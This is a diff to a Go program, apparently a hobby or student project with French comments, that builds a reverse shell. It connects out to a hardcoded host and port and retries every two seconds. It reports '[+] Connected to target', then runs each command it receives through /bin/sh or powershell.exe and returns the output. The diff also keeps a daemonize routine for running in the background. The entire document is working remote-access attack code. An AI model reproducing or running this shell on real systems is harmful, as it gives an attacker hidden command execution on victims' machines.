@@ -7,6 +7,8 @@ import (
 	"os/exec"
 	"runtime"
 	"strconv"
+	"strings"
+	"time"
 
 	"github.com/takama/daemon"
 )
@@ -15,8 +17,8 @@ import (
 // - afficher prompt
 
 func main() {
-	daemonize()
-	reverseShell("192.168.1.24", 1111)
+	// daemonize()
+	connectToClient("192.168.1.24", 1111)
 }
 
 func daemonize() {
@@ -26,24 +28,33 @@ func daemonize() {
 	handleError(err)
 }
 
-func reverseShell(host string, port int) {
+func connectToClient(host string, port int) {
 	connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
-	handleError(err)
-	var shell string
-	if runtime.GOOS == "windows" {
-		shell = "powershell.exe"
+	if err != nil {
+		time.Sleep(2 * time.Second)
+		connectToClient(host, port)
 	} else {
-		shell = "/bin/sh"
+		connexion.Write([]byte("[+] Connected to target.\n"))
+		var shell string
+		if runtime.GOOS == "windows" {
+			shell = "powershell.exe"
+		} else {
+			shell = "/bin/sh"
+		}
+		reverseShell(connexion, shell)
 	}
+}
+
+func reverseShell(connexion net.Conn, shell string) {
 	for {
 		clientEntry, err := bufio.NewReader(connexion).ReadString('\n')
 		handleError(err)
-		cmdOutput, err := exec.Command(shell, clientEntry).Output()
-
+		cmdOutput, err := exec.Command(shell, strings.TrimSuffix(clientEntry, "\n")).Output()
 		if err != nil {
-			connexion.Write([]byte("Unknown command.\n"))
+			connexion.Write([]byte("[-] Unknown command.\n"))
 		}
 		_, err = connexion.Write(cmdOutput)
+		connexion.Write([]byte("[+] Command sent.\n"))
 		handleError(err)
 	}
 }
